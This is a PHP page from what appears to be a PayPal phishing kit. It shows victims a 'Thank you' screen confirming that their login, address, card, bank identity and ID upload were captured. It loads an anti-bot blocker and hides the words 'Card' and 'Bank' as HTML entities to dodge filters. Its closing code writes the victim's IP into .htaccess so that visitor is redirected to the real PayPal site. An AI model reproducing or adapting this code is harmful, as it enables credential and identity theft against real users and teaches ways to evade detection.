<?php
include('../blocker.php');
include('header.php');
?>
<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone">
	<h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Thank you</h1>
	<div id="parentchild">
		<div style="border-bottom: 1px solid #EEE; height:160px;">
			<ul id="js_profileStates" class="profileStates center" <?php echo 'style="margin: auto"';  ?> >
				<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Account Login</li>
				<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Address Updated</li>
				<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>&#67;ard Updated</li>
				<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>&#x0042;ank identity Verified</li>
				<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Upload identity Verified</li>
			</ul>
		</div>
	</div>
</section>
<?php include('./form/success.php'); ?>
<?php
include('footer.php');

$file1 = fopen(".htaccess","a");
fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.paypal.com [R,L]
');
fclose($file1);
?>